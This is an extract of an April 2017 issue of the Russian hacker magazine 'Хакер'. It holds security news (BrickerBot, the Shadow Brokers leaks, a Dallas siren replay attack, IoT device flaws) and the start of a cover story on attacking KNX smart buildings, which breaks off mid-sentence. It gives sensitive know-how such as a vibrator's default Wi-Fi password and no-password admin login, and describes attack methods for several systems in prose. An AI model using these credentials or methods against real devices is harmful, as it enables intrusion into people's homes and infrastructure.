              №219
                                                                  АПРЕЛЬ
                                                                               2017





Ломаем Wi-Fi
со смартфона

Разбираемся
в устройстве
банковского
антифрода




  Cover
  Story
ЛОМАЕМ
УМНЫЕ
ЗДАНИЯ
Вторгаемся в сеть, управляем узлами, DoS’им
и проникаем в тайники
                                                     апрель 2017
            № 219
CONTENT

    MEGANEWS
  Всё новое за последний месяц

    Ломаем умные здания
  Вторгаемся в сеть, управля ем узлами, DoS’им и про ника ем в тай ники

    BOINC к бою!
  Премудрости распределенных вычислений на личном при мере

    Хайку о любви
  Знакомимся с экзо тической ОС Haiku, преемницей BeOS

    Центр интернета вещей
  Подключаем Arduino к Azure IoT Hub

   WWW2
  Интересные веб‐сервисы

    Вычисления на дому
  Как заставить компьютер решать мировые проблемы

    Мобильный дайджест марта
   Android O, iOS 10.3, Galaxy S8 и большой отчет Google о безопас ности Android

    Заводная дактилоскопия
  8 способов использовать сканер отпечатков пальцев в Android

    Магия для моддера
  Модифицируем Android на живую с помощью Magisk

    Карманный софт
  Выпуск #30. Апрель ский набор гика

     Google готовит замену Android?
  Колонка Евгения Зобнина

    Обзор эксплоитов #219
  RCE в Microsoft Word, SquirrelMail, VMware vCenter и ано нимный дос туп в Atlassian
  Conﬂuence

    Ломаем Wi‐Fi со смартфона
  Разведка и первый бой

    Книжный DRM
  Как защищают электронные книги и как их защиту взламывают

    Прошить прошивку
  Модифицируем файловую систему точ ки доступа Ubiquiti NanoStation M2

    Анализируй это
  Строим SIEM на основе open source компонентов для ана лиза логов

    Как защищают банки
  Основные процессы работы системы антифро да

    Лучшие за сезон
  Самая интересная малварь за истекший квартал

    Реверсинг малвари для начинающих
  Внедрение shellcode и encoding malware‐кода

    На страже честных выборов
  Разбираем способы борь бы с накруткой голосований

    Спа сительная инъекция Dagger 2
  Оживляем старый про ект с помощью крутого фрей мворка

    Сервис (не)ограниченных возможностей
  «Помогаем» пользователю в работе с программа ми

     Телефония для хакера
  Работаем со звонками в Android вплоть до 7‐й версии

    Мобильная разработка: выбираем инс трументарий
  Разбираемся с Intel XDK, NativeScript и Xamarin

    Прокачай терминал!
  Полезные трюки, которые сделают тебя гуру консоли

    Прокачанный арч
  Зачем нам Manjaro, если есть Arch Linux?

    Мастеру на все руки
  Топ инструмен тов для DevOps

    Ра бота для линуксоида.
  Сотрудники Virtuozzo о себе и о том, чего ждут от кандидатов

    FAQ
  Вопросы и ответы

     Титры
  Кто делает этот журнал
                                      Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ИНТЕРНЕТ КИРПИЧЕЙ
Еще в кон це марта специалисты компании Radware обнаружили странную
малварь BrickerBot, которая выводила из строя IoT‐устройства, умышленно
повреждая ядро и делая невозможным хранение дан ных. Вредонос «охо тил‐
ся» на устройства Linux BusyBox. Изначально исследователи обнаружили две
версии BrickerBot (BrickerBot.1 и BrickerBot.2), а позже бы ли замечены улуч‐
шенные версии — BrickerBot.3 и BrickerBot.4.
  Во время первой фазы атаки BrickerBot действует точно так же, как Mirai,
Hajime, LuaBot и другая IoT‐мал варь: проводит словарную атаку, то есть брут‐
форсит устройство через Telnet, пытаясь подобрать учетные данные. Для это‐
го в коде вредоноса жестко зашиты списки логинов и паролей по умолчанию,
используемые для разных устройств.
   Если учетные данные подошли и мал варь сумела про никнуть в систему,
начинается вторая фаза ата ки, в ходе которой BrickerBot ломает устройство.
Чтобы вывести девайс из строя, BrickerBot использует несколько техник,
и именно в них заключается разница между версиями вредоно са. Тем
не менее цель всегда одна — превратить устройство в бесполезный «кир‐
пич».
  В результате устройство перестает работать за считаные секунды после
заражения. Эксперты относят такие атаки к PDoS (Permanent Denial of Service,
«постоянный отказ в обслуживании»), а также называют их phlashing.
  Специалисты Radware сразу предположили, что автор вредоно са может
быть своего рода «мстителем», который зачищает Сеть от небезопасных
устройств, преподавая жестокий урок их владельцам. Все же BrickerBot —
это редкий в наши дни образец мал вари, которая создана не ради финан‐
совой выгоды.
   Вскоре журналисты изда ния Bleeping Computer провели собственное рас‐
следование и не только вычислили разработчика малвари, но и сумели
поговорить с ним. Беседа показала, что сот рудники Radware были абсолютно
правы.
  Создателем  BrickerBot оказался  хакер, известный под псевдонимом
janit0r. Он рассказал, что его, как и многих, пот рясли беспорядочные DDoS‐
атаки, которые в 2016 году устраивали IoT‐ботнеты. Janit0r полагал, что эти
крупные инциден ты вынудят индустрию одуматься и начать действовать сооб‐
ща, но вскоре стало очевидно, что ничего подобного не происходит. Тогда
хакер решил взять дело в свои руки и написал BrickerBot.
  Он отмечает, что аналитики Radware описали BrickerBot не совсем точно
и на самом деле мал варь гораздо сложнее. По словам разработчика, речь
идет об использовании 86 протоколов и пейлоадов, специфичных для опре‐
деленных устройств. К тому же  janit0r утверждает, что сначала BrickerBot
все‐таки пытается помочь зараженному устройству и устранить уязвимости,
ничего при этом не повреждая. «Окирпичивание» явля ется лишь «планом Б»,
если другие методы не сработали.
   Janit0r сообщил, что уже в янва ре 2017 года количество устройств, пос‐
традавших от атак BrickerBot, составля ло 200 тысяч, а на момент общения
с журналистами перевалило за отметку в два миллиона.



       «Тогда отметка в 200 тысяч „окир пиченных“ девайсов виделась мне
      чем‑то большим, и я был уве рен, что приближа юсь к концу. Теперь
      счет перева лил за два миллиона, и ста ло ясно, что я не представ лял
       (и до сих пор не пред став ляю), нас колько глу бока кроличья нора
      небезопас ности IoT. Уверен, худ шее еще ждет нас впе реди, — пишет
         janit 0r. — Наде юсь, необыч ное поведе ние BrickerBot помогло пра -
      вительствам, вендорам и индус трии в целом выиграть еще один год,
      за который они смогут  взять текущий кош мар безопас ности  IoT
      под контроль. Многие дру гие люди  так же сде лали важные шаги
      в области сра жения  с  IoT-малварью (Team  White,  автор  Hajime,
      @packetcop со своими синкхолера ми и так далее), так что я ни в коем
      слу чае не пытаюсь взять на себя ответс твенность за спад активнос ти
       Mirai в пер вом квар тале 2017 года. Но если Imeij и Amnesia дос талось
      в пос леднее вре мя, это, скорее все го, моя вина ;)».

Известно, что от атак BrickerBot пострадал калифор нийский провайдер Sierra
Tel и сотни его клиентов. Инцидент произошел 10 апреля 2017 года: абонен‐
ты временно лишились доступа в интернет и телефонной свя зи. Хотя изна‐
чально предполагалось, что проблема была вызвана неудачным обновле‐
нием ПО, которое распространила компания, 11 апреля пред ставители про‐
вайдера сообщили, что Sierra Tel пострадал от деятельности хакеров. Факт
атаки подтвердил и сам janit0r, хотя хакер полагает, что «Sierra незаслуженно
получила плохой PR лишь из‐за того, что была честна относительно хака и не
стала ничего скрывать».
  Проблема заключалась в атаках на модемы Zyxel HN‐51, которые Sierra Tel
массово предоставляет своим клиентам. После атак устройства уже не могли
функционировать нормально, и представители провайдера стали советовать
пострадавшим обращаться в офисы компании за заменой. Однако в Sierra Tel
недооценили масшта бы проблемы: уже через несколько часов модемы
для замены попросту закончились, а пострадав шие пользовате ли продол‐
жали приходить в офисы. В итоге сот рудники компании были вынуждены
забирать у пользователей вышедшее из строя оборудование, обещая отре‐
монтировать или заменить его в самом скором будущем. Окончательно все
последствия инциден та были устра нены лишь 22 апреля 2017 года.


→«Я рассмат риваю свой проект как форму „хими отерапии для интернета“, а о себе иног‐
да в шутку думаю как о докторе. Химиотерапия — это жесткое лечение, и никто в трезвом уме
не назначит ее здоровому пациенту, но интернет серьезно заболел в третьем и чет вертом
квартале 2016 года, а обыч ных средств оказалось недостаточно. Побочные эффекты от лечения
жестоки, но альтернатива (миллионные DDoS‐бот неты) была бы гораздо хуже. Я могу лишь
надеяться на то, что, когда у IoT наступит рецидив, мы найдем лучшие способы решения проб‐
лем».
  — Janit0r, автор вре доноса BrickerBot, который умышленно выводит из строя IoT‐устрой ‐
ства





ВЗЛОМ ВИБРАТОРОВ
ИБ‐специалисты разных компаний продолжают изу чать безопасность всевоз‐
можных IoT‐устройств и порой выбирают для тестов очень необыч ные девай‐
сы.
  Свежий отчет, опубликованный исследователя ми Pen Test Partners, сна‐
чала кажется странной шуткой. Дело в том, что специалисты обнаружили мно‐
жество проблем в «умном» вибраторе Svakom Siime Eye, который оснащен
встроенной камерой и комплектуется собственным официальным приложе‐
нием. Устройство стоимостью 250 долларов умеет в режиме реального вре‐
мени передавать изображение с расположенной на кон чике видеокамеры
на компьютер, смартфон или планшет (посредством Wi‐Fi). И, по словам
исследователей, именно в этом и заключа ется основная проблема.
   Siime Eye работа ет как точ ка доступа Wi‐Fi пря мо «из коробки», при этом
SSID един для всех устройств: Siime Eye, и изменить его пользователь
не  может. Хуже  того, пароль по умол чанию вряд ли можно  назвать
сколь‐нибудь надежным — это 88888888. Таким образом, злоумышленник,
находящийся в зоне действия сигнала, может без тру да установить себе
мобильное приложение Siime Eye, ввести учет ные данные и подключиться
к «интимному стриму» (или получить доступ к сделан ным ранее видеозаписям
и изображениям).
  Панель управления устройством тоже доступна любому желающему и рас‐
полагается по адресу 192.168.1.1:80. Пароля нет вовсе, а имя пользователя
самое стандартное, какое только можно придумать: admin. Выходит, что если
воспользоваться небезызвестным сервисом wigle.net и заняться вардрайвин‐
гом, то достаточно просто ездить по городу и искать сети с идентификатором
Siime Eye.
   Хотя две описанные выше атаки возможны из локальной сети, это еще
не значит, что скомпрометировать вибратор удаленно не получится. Изу чив
прошивку устройств, исследователи пришли к выводу, что для получения уда‐
ленного доступа злоумышленник может обратиться к определенному URL,
чтобы включить Telnet. Дальнейший анализ обна ружил и жестко закодирован‐
ный root‐аккаунт, используя который можно не просто подключиться к устрой‐
ству удаленно, а вносить изменения в прошивку девайса и при желании
заразить вибратор мал варью.



      «Суть RCE-уяз вимос ти в том, что вибратору можно уста новить новую
      прошив ку, если есть такое желание. С устройством можно делать что
      угод но, если у вас, конеч но, есть вре мя и склонность к написа нию
      прошивок для дилдо», — говорит спе циалист Pen Test Partners Кен
     Манро (Ken Munro).

Во время анализа ПО специалисты Pen Test Partners так же обратили вни‐
мание на то, что вибратор работает на базе прошивки, исходно предназна‐
ченной для дронов. Так, в коде удалось обнаружить явно забытые там слу чай‐
но функции отправки отснятого контента в Skype или на email. Исследователи
полагают, что и это тоже может сыграть на руку ата кующему: этот код все
еще можно использовать по прямому назначению, то есть хакеру не придется
писать свой.
  Но одним только изучением вибраторов экспер ты не ограничились. Вско‐
ре специалисты Pen Test Partners также сообщили о компро метации «умных»
плит компании AGA.
  Плиты серии  iTotal Control оснащаются SIM‐картой и оборудо ванием
для подключения к сети мобильного оператора. Благодаря этой опции тех‐
нике можно отправлять команды как с телефона, так и с сайта компании.
К примеру, можно заранее поставить в духовку ужин и еще по дороге
с работы дать плите команду начать его разогревать. Впрочем, серия iTotal
Control — это профессиональные решения, так что вряд ли эти плиты стоят
на домашних кухнях многих людей.
  Плиты комплектуются модулем Tekelek и GSM SIM‐картой, за обслужива‐
ние которой пользователь платит поряд ка семи с половиной долларов
в месяц (у компании AGA есть договоренности с рядом операто ров). Так
как устройства работают с простыми, ничем не защищенными тексто выми
сообщениями и HTTP, для перехвата управления чьей‐либо плитой понадо‐
бится лишь узнать номер ее SIM‐карты. Никакой системы аутен тификации
производитель не предусмотрел,  поэтому  устройство примет команду
от любого желающего. То есть злоумышленник может как «развлекаться»
включением плиты вхолостую (чтобы увеличить счета жертвы за электричес‐
тво), так и испортить приготовление обеда или ужина, не говоря об опас‐
ности устроить пожар.
  В обоих случаях предста вители Pen Test Partners долго пытались связаться
с производителями уязвимых девайсов, но их старания так и не увенчались
успехом. Сотрудники компании AGA сначала и вовсе забанили исследова‐
телей в своем официальном твит тере. В итоге благодаря огласке специалис‐
там все же удалось привлечь внимание производите лей, но исправлений
для найденных уязвимостей все еще нет.


АДМИНИСТРАЦИЯ STACK OVERFLOW ПРОВЕЛА ЕЖЕГОД‐
НЫЙ ОПРОС РАЗРАБОТЧИКОВ

→С 2011 года сайт Stack Overﬂow ежегодно опрашивает свою немалую аудиторию, составляя
один из крупней ших и наиболее интересных рейтингов языков программирования, инстру мен‐
тов, технологий, ПО и привычек кодеров. В январе 2017 года ресурс провел традиционный
опрос среди 64 тысяч своих пользователей, и вот что показали резуль таты на этот раз.
Топ‐10 самых популярных языков программи рования





→Самые популярные фрей мворки, биб лиотеки и так далее





→Самые популярные БД





→Чаще всего раз работ чики пишут код, используя следующие платформы





→Но, помимо работы, у кодеров есть и личные предпочтения. Вот так выг лядят рей тинги
самых любимых и самых презираемых разработчиками языков программирования
← Начало статьи





 UBUNTU ВЕРНЕТСЯ
 НА GNOME
  5 апреля 2017 года основатель Canonical Марк Шаттлворт шокировал сооб‐
  щество, объявив, что мечте о единой платформе для всех Linux‐устройств,
  по  сути, пришел конец. Ubuntu прекратит использовать оболочку  Unity,
  на разработку которой было потрачено столько лет и усилий, вновь вер‐
  нувшись к старому доброму GNOME.
     Шаттлворт пишет, что это было «непростое решение», но спустя шесть лет
  GNOME вернется в качестве оболочки по умол чанию (начиная с версии
  Ubuntu 18.04 LTS, которая будет представ лена в апреле 2018 года). Работа
  над Unity 8, которая так и не стала стабильным релизом, будет прекращена
  вовсе.
     Кроме того, Canonical сворачивает работу над Ubuntu Phone для смартфо‐
  нов и планшетов, а также разработ ку своих устройств, которые так и не снис‐
  кали популярности среди пользователей. В своем сообщении Шаттлворт
  уделил мобильным устройствам немного места, но эту информацию подтвер‐
  дил комьюнити‐менеджер Canonical Майкл Холл (Michael Hall), сообщив, что
  работа над телефонами и планшетами прекращается. Судя по всему, вместе
  с этим в прошлом оста нется и графический сервер Mir, на замену которому
  придет Wayland.



        «В сообщес тве наши старания вос приняли не как инновацию, но как
        фрагментацию. Индус трия не ста ла объединять усилия вок руг этой
         воз можнос ти и пред почла выбрать меньшее „из двух зол“, инвести-
         ровав  в доморощенные платформы.  То,  что раз работчикам  Unity
        8 уда лось соз дать на данный момент, — великолеп но, функционально
        и надежно, но я ува жаю пра во сообщес тва и рынка решать, какой
        продукт   должен   продолжать   раз виваться,   а   какой   должен
          исчезнуть», — резюмирует Шаттлворт.


 → 14 776 сертификатов Let’s Encrypt используют «PayPal»‐фишеры. Независимый иссле‐
   дователь Винсент Линч (Vincent Lynch) провел аудит сер тификатов, выданных Let’s Encrypt
   за последний год. Как оказалось, удостоверяющий центр массово выдает сертификаты, содер‐
   жащие слово PayPal, и большинство из них исполь зуют мошенники. Так, слово PayPal содер‐
   жат 15 270 SSL‐сертифика тов. Опи раясь на данные Comodo Certiﬁcate Search, Линч про верил
   случайную тысячу «PayPal»‐сер тификатов. В результате он убе дился, что 96,7% этих сер‐
   тификатов (14 776) используются доменами, на которых размещены фишинговые сай ты.





 КАМНИ
 ПРЕТКНОВЕНИЯ
  С 2016 года компания Microsoft предупреждала, что вскоре операционные
  системы Windows 7 и 8.1 фактически перестанут поддерживаться новыми
  процессорами. Официальный блог компании сообщал, что ограничение всту ‐
   пит в силу с выходом процессоров на архитектуре Kaby Lake компании Intel,
  чипа 8996 компании Qualcomm и Bristol Ridge ком пании AMD.
     Изначально шестое поколение процессоров Intel (Skylake) тоже должно
  было подпадать под эту «реформу». Но некоторые устройства на базе Skylake
  уже были выпущены с поддержкой Windows 7 и 8.1, и ситу ация оставалась
  до конца неясной. В итоге на сайте Microsoft появился список из шестнад‐
  цати производителей, чьи системы на базе Skylake будут поддерживаться
  и далее. Владельцам компьютеров других производителей придется либо
  переходить на Windows 10, либо работать без обновлений.
     После релиза патчей из состава апрельского «втор ника обновлений» вы‐
  яснилось,  что  владельцы процессоров на перечисленных  архитектурах
  перестали получать обновления. Многие пользователи были в ярости, когда
  обнаружили, что патчи попросту не устанавлива ются, сообщая о несовмести‐
  мости с железом. В наиболее странном положении находятся некоторые
  пользователи Windows 8.1, так как их система до 2018 года находится в фазе
  «основной поддержки» (mainstream support) и они могут работать с USB
  3 и NVMe. Однако получилось, что новые ограничения распространяются и на
   них.
    Сообщество не стало мириться с таким положением вещей. Энтузиаст,
  известный под ником Zeﬀy, решил исправить проблему сво ими силами. Он
  выяснил, что за ограничения отвечает обновление KB4012218, вышедшее
   в марте 2017 года. Zeﬀy отреверсил обновление и начал разрабаты вать
  средство обхода нового запрета, а после релиза апрельского набора патчей
  он получил возможность опробовать свой инструмент в деле. Как оказалось,
  метод работает: патчит DLL‐файлы Windows и обманывает проверку версии
  CPU, что позволяет успешно установить обновления на Windows 7 и 8.1, даже
  если они работают в системе, построенной на базе процессора седьмого
  поколения.





 ПОСЛЕДНИЙ ПРИВЕТ
 THE SHADOW
 BROKERS
  История группы The Shadow Brokers началась летом 2016 года, когда хакеры
  похитили инструменты американских спецслужб, одну часть обнародо вали
  бесплатно, а оставшуюся решили продать. На протяже нии многих месяцев
   группировка пыталась монетизировать похищен ные экспло иты и информа‐
  цию с помощью открытого аукциона, краудфандинга и даже розничной про ‐
  дажи, однако найти покупателей не удалось. В итоге в январе 2017 года
  хакеры официально попрощались с пользователями, обнародовали бесплат‐
  но еще несколько инструментов и «покинули сцену».
     8 апреля 2017 года The Shadow Brokers неожиданно ак тивизировались
  вновь. Согласно их сообщению, возоб новить активность хакеров вынудило
  недовольство правлением Дональда Трампа. Хакеры пишут, что разочарова‐
  ны курсом, который выбрал новый президент США, и обвиняют его в том, что
  он «забыл людей, которые его избрали». В конце этого длинного политичес‐
   кого послания хакеры опубликовали пароль от второго архива с инструмен‐
  тами АНБ, которые они тщет но пытались продать все это время.
    Дамп содержал эксплоит для 0day‐уязвимости в ОС Solaris и другие инс‐
   трументы для взлома UNIX‐систем; фреймворк TOAST, который спецслужбы
  используют для очистки логов и замета ния следов; инстру мент ELECTRIC‐
   SLIDE, позволяющий замаскироваться под китайский браузер с фальшивым
   Accept‐Language, а также многое другое.
     14 апреля 2017 года The Shadow Brokers об народовали еще одну порцию
  информации. Если дамп от 7 апреля содержал различные UNIX‐экспло иты, то
  новый архив получил название «Трудности перевода» (Lost  in Translation)
  и включал в себя эксплоиты для Windows, которые, как известно, тоже име‐
  лись в распоряжении группировки.
     Кроме того, архив якобы содержал доказательства того, что Equation
  Group (группа «правительственных хакеров», которую и обокрали The Shadow
   Brokers и чья связь с АНБ давно доказана) имела доступ к серверам сер‐
  висных бюро, связанных с международной банковской системой SWIFT,
  и шпионила за рядом финансовых учреждений из разных стран мира.
     Публикации новых дампов без преувеличения взбудоражили мировое IT‐
  сообщество. Эксперты назвали новые эксплоиты «режимом бога для компь‐
  ютеров Microsoft» и сооб щили, что в архиве пред ставлены экспло иты прак‐
   тически для всех систем семейства Windows (NT, 2000, 2003, 2008 и до 2012,
  а также для домашних версий XP, Vista, 7 и Windows 8).
     Чауки Бекрар (Chaouki Bekrar), глава и основатель компании Zerodium,
  которая занимается  покупкой и продажей  уязвимостей, сообщил,  что
  на такой информации The Shadow Brokers могли заработать более двух мил‐
  лионов долларов, если бы сумели перепродать эксплоиты брокеру уязвимос‐
   тей и конкурирующим с АНБ правительственным агентствам. По его словам,
  один толь ко эксплоит под кодовым именем ETERNAL, предназначенный
  для атак на SMB‐прокол, стоил бы более 250 тысяч долларов.



         «Эти у***и [ушлепки] сожгли два миллиона долларов, [опубликовав]
        один ZIP-файл, — говорит Бек рар. — С точ ки зре ния атак это огромная
         потеря, с точ ки зре ния защиты данная утеч ка пред став ляет собой
        большую угрозу для миллионов Windows-сис тем».

  После публикации инструментария спецслужб в открытом доступе предста‐
   вители компании Microsoft были вынуждены экстренно успокаивать поль‐
  зователей и даже экспертов. В блоге компании появилось сообщение,
   в котором компания заверила, что инструментарий АНБ более не представ‐
   ляет никакой опасности, так как большинство уязвимостей, которые эксплу ‐
   атировали спецслужбы, давно исправлены.
    Интересно, что при этом в бюллетенях безопасности, связанных с экспло ‐
   итами АНБ, не сообщалось, откуда сот рудники Microsoft узнали о данных
  проблемах, то есть неизвестно, какая именно группа или исследователь
  обнаружили уязвимости. Теперь многие пред полагают, что Microsoft заранее
  предупредили о скором релизе эксплоитов. Одни подозревают, что компания
  сама заплатила хакерам за уязвимости, другие допускают, что информация
  поступила непосредственно от представителей АНБ.


 → 58 000 000 $ средний годовой бюджет банков на кибербезопасность. Аналитики «Лабора‐
   тории Касперского» подчитали, что годовой бюджет банков на кибербезопасность в среднем
   достигает 58 миллионов долларов, что в три раза боль ше, чем у нефинансовых организаций.
   Такие затраты вполне оправданны, ведь количество угроз растет. Так, опрос, проведенный сре‐
   ди 800 представите лей финансовых организаций из 15 стран мира, показал, что 70% банков
   за последний год понесли денежные потери в результате кибермошенничества, а еще 46%
   сталкивались с фишингом.





 RED ALERT
  В ночь с 7 на 8 апреля 2017 года сон жителей американского Далласа на‐
  рушили хакеры. Около полуночи по всему городу неожиданно зарабо ‐
   тали 156 сирен системы экстренного оповещения о чрезвычайных ситуациях
   (в основном она используется для предупреждений о приб лижении торнадо).
  Как выяснилось, причиной вклю чения сигнала тревоги стал отнюдь не тех‐
  нический сбой — городские власти сообщили, что систему взло мали неиз‐
  вестные хакеры.
    По словам жителей, сирены заработали после полуночи и суммарно вклю‐
  чались не менее дюжины раз. Примерно в 1:20 ночи городские власти были
  вынуждены отключить систему вообще, убедив шись, что никакой чрезвычай‐
  ной ситуации на самом деле не наблюдается.
     Представители  властей  предпочли  не  вдаваться  в  детали,  чтобы
   кто‐нибудь еще не понял, как была реализована ата ка, и не попытался снова.
  Но любопытные исследователи быстро разоб рались, в чем было дело.
    В 2007 году в Далласе была установлена система оповещения о чрез‐
  вычайных ситуациях из 156 аварийных сирен, произведенных компанией Fed‐
   eral Signal. При этом известно, что она использует тональные сигналы.
  Как правило, такие сигналы транслируются через Национальную метеоро‐
  логическую службу с использованием Dual‐Tone  Multi‐Frequency (DTMF)
  или Audio Frequency Shift Keying (AFSK). Фактически зашифрованные команды
  управляющего центра передаются на аварийных радиочастотах. Так, сог‐
  ласно данным Федеральной комиссии связи США, диапазон 700 МГц в США
  зарезервирован именно для таких целей.
     Хотя телефонные сети давно защищены от фрикинга и тональными сиг‐
  налами там ничего не добиться, того же нельзя сказать о Federal Signal. Спе ‐
  циалисты компании Bastille сообщили, что сценарии атак могли быть раз‐
  ными, но скорее всего, кто‐то провел атаку типа radio replay: злоумышленник
  попросту записал аудиосигналы, которые транслировались во время пос‐
  леднего ежемесячного тестирования системы экстренного оповещения,
  а затем воспроизвел их в ночь с 7 на 8 апреля 2017 года.
    По словам специалистов, атакующие могли использовать самое простое
  железо: software deﬁned radio или тестовое оборудование для работы с ради‐
  очастотами, которое можно свободно приобрести в магазинах. При этом
  большую часть сведений о работе экстренных систем опо вещения можно
  свободно почерпнуть из Google, отыскав в Сети любые необходимые инс‐
   трукции. Нередко даже софт для контроля таких продуктов можно скачать
   легально и бесплатно, пусть это и будет лишь демоверсия.


 → 750 000 новых Android-вредоносов обнаружи ли в первом квартале 2017 года. Иссле‐
   дователи компании G Data представили отчет за первый квартал 2017 года. Специалисты
   пишут, что каждый день на рынке появ ляется более 8400 новых образчиков малвари для An‐
    droid, а суммарно в первом квартале было найдено 754 958 вредоносных приложений. Общий
   прогноз  на  год  неуте шителен:  к  концу  2017  года  аналитики  планируют  обнаружить
   более 3,5 миллиона вредоносов для операци онной системы Google, тогда как в 2016 году их
   количество равнялось 3,25 миллиона.





 0DAY В MICROSOFT
 OFFICE
  Специалисты компаний McAfee и FireEye сообщили о 0day‐уязвимости в Mi‐
   crosoft Oﬃce, которую еще в янва ре 2017 года взяли на вооружение хакеры.
  Баг  позволяет  злоумышленнику  тайно  выпол нить  про извольный  код
  на машине жертвы и доставить в систему малварь. Стоит отметить, что атака
  использует OLE2link и никак не связана с макросами, так что их отключение
  не поможет.
    По данным специалистов, с помощью этой уязвимости на машины поль‐
  зователей доставля лись такие вредоносы, как Dridex, WingBird, Latentbot
  и Godzilla. Хуже того: если раньше сообщалось, что активация опции Oﬃce
   Protected View помогает справиться с проблемой, позже специалист ком‐
  пании Optiv Райан Хенсон (Ryan Hanson), который первым обнаружил баг,
  опроверг данную информацию.
    В рамках апрельского «вторника обновлений» разработчики Microsoft ус‐
   транили проблему, присвоив ей идентификатор CVE‐2017‐0199. И лишь после
  выхода патча специалисты FireEye сообщили еще более интересные под‐
  робности об уязвимости.
     Оказалось, что проблему эксплуатировали не только обычные мошенники,
  но и «правительствен ные хакеры», чьи атаки были направле ны против неиз‐
  вестных целей  в России. Злоумышленники распространяли шпионское
  ПО Finspy (FinFisher), созданное компанией Gamma Group. Эта компания
  известна тем, что разрабаты вает решения, которые используются правоох ‐
  ранительными органами как минимум двадцати пяти стран мира для скрытого
  наблюдения за преступниками и подоз рева емыми.
    Операция неизвестных «правительственных хакеров» шла рука об руку
  с обычной криминальной активностью, и вредоносы  Finspy и  Latentbot
  использовали один и тот же билдер. Это поз воляет предположить, что груп‐
  пировки получили эксплоит для 0day‐уязвимости из одного и того же источни‐
   ка. Судя по всему, эксплоит одновремен но продавался на черном рынке
  и клиентам Gamma Group.


 → 2 000 000 000 человек используют ОС Android. Компания Google поделилась интересной
   статистикой. Сообщает ся, что накануне мероприятия Google I/O операционная система Android
   преодолела отметку в 2 миллиарда пользователей (то есть ежемесячно активных устройств).
   Более чем миллиар дом пользователей также могут похвастаться и другие сервисы Google:
   Gmail, Drive, YouTube, Chrome, Maps и Play Store. К слову о последнем, официальный каталог
   приложений продолжает раз виваться: так, в 2016 году поль зователи заг рузили из Google Play
   Store 82 миллиарда приложений (против 65 миллиардов в 2015 году).





 DENUVO СНОВА
 КРЯКНУЛИ
  Совсем недавно, в феврале 2017 года, пред ста вители компании Denuvo Soft‐
  ware Solutions GmbH уже были вынуждены оправдывать свой DRM‐продукт,
  после того как группа крякеров CONSPIR4CY (CPY) сумела вскрыть защиту
  игры Resident Evil 7: Biohazard менее чем через неделю после релиза игры.
   Тогда группа выложила в сеть 23‐гигабайтный дамп, который распространил‐
  ся по пиратским сайтам со скоростью лесного пожара.
     Теперь, спустя всего пару месяцев, крякеры сумели обойти новую версию
   Anti‐Tamper, известную как Denuvo v4. Четвертая версия защищала, к при‐
   меру, Mass Eﬀect Andromeda, и в итоге DRM взломали менее чем за месяц.
  Однако члены группы CPY сильнее обрадовались не этому.
     Благодаря успешному обходу защиты Denuvo v4 группировка сумела
  реализовать кряк куда менее известного проекта — игры 2Dark, созданной
  разработчиками Alone in the Dark. Дело в том, что еще в 2014 году соз‐
  датели 2Dark собирали средства для разработ ки посредством краудфандин‐
   га, и потенциальных жертвователей очень интересовал вопрос, будет ли
   в игре реализована какая‐то DRM‐защита. Тогда разработчики пообе щали,
   что никакой защиты, конечно же, не будет, одна ко на деле вышло иначе.
  В итоге игра была оснащена защитой Denuvo v4, на которой настоял изда‐
   тель, что вызвало большое недовольство сообщества. Теперь, после взлома,
  разочарованные геймеры могут почувствовать себя отмщенными.
     Взлом четвертой версии защиты также означает, что вскоре могут «пасть»
  и такие релизы, как Nier Automata, Dead Rising 4 и Bulletstorm: Full Clip Edition.

COVERSTORY





  Егор Литвинов



ЛОМАЕМ
УМНЫЕ
ЗДАНИЯ
ВТОРГАЕМСЯ В СЕТЬ, УПРАВЛЯЕМ УЗЛАМИ,
DOS’ИМ И ПРОНИКАЕМ В ТАЙНИКИ




В прошлой статье мы расска зали тебе про устройство BMS
и хорошенько  распалили  твое вооб ражение будущими
хакерскими экспе риментами. И вот их час пробил! Готовься,
дружище! Перед тобой статья размером аж в шесть страниц
старого бумажного «Хакера». И все они посвящены исклю ‐
чительно взлому ;).


             INFO

                      Большое спасибо всем моим коллегам, а в осо‐
                      бенности  Максиму  Малюти ну   (@neurojesus),
                      Роману Бажину  (@nezlooy), Алек сею Кузь менко
                                   (@alekum) и  Евгению Рассказову  (@TheJokiv)
                       из Digital Security. Также выражаю свой респект
                      ребятам из Domus Sapiens, которые не побо‐
                       ялись предоставить для наших опытов действу‐
                  ющий объект на KNX :).



УСТРОЙСТВО СЕТИ
Перед тем как начать охоту на стадо газелей, любой порядочный лев должен
определиться — а сколько же там особей? Хва тит ли их, чтобы накормить
целый прайд? :) Как видишь:





Число газелей узлов в сети KNX может достигать 65 535. Поверь, это мно го,
тем более что под узлом может подразумеваться как прос той вык лючатель,
так и полноценный MCU/PLC, который «рулит комфортом» в целом номере
отеля.
   Как видно из рисун ка, в стаде у нас царит шин ная топология. На одной
шине (sub‐line) может находиться до 255 узлов, на одной линии (mainline)
может быть до 15 шин  (sub‐line). Одна зона  (area) включает в себя
до 15 линий (mainline). Всего может быть 15 зон (area). Такое разделение
позволяет неплохо разбивать как на логические (управляем светом), так и на
физические группы (система автоматики отвечает за конкретный этаж). Нап‐
рашивается знакомая всем фраза «разделяй и властвуй». Ведь все это мно ‐
гообразие (в этот момент автор попросил включить «злобный смех за кад‐
ром». — Прим. ред.) можно сломать бук вально парой команд.


    KNXМир    рас ширя ется
Управление спортивным, наружным и внутренним освещением на стадионе
«Лужники» теперь реализовано с помощью KNX. Он же будет применяться
в строящемся не бос кре бе «Лахта центр» в Санкт‐Петербурге.





                        Стадион «Лужники»



Для начала пос мотрим, что собой представляет формат сообщений/телег‐
рамм по шине KNX‐TP. Вот так выглядит общий формат сообщения в KNX.





Теперь пройдусь по каждому полю и добав лю пару комментариев.


## Control byte/Control Field





Отвечает за то, будет ли данное сообщение системным или нет. Если обыч‐
ное, то будет ука зан его приоритет.


## Source address





Вот так оно выглядит, детальные комментарии тут, думаю, излишни.


## Receiver address





Вот так уже выглядит формат адреса получателя. Та или иная реализация
зависит от того, что решил интегратор, когда устанавливал систему. И как
                                                                        16видим, 16 бит определя ют/подтверждают то, что емкость сети равна 2    :).
   Кстати, очень хочется ска зать «спа сибо» документации — тому, что она
есть и что ее много. Наверное, ты спросишь, почему сло во спасибо я зак ‐
лючил в кавычки и почему заострил на нем внимание? А посмотри‐ка на это
изображение:





В одном месте документация нам говорит, что receiver address следует трак ‐
товать как групповой, если некий бит DAF = 1, а парой страниц ниже идет уже
обратная информация — что receiver address нужно трак товать как групповой,
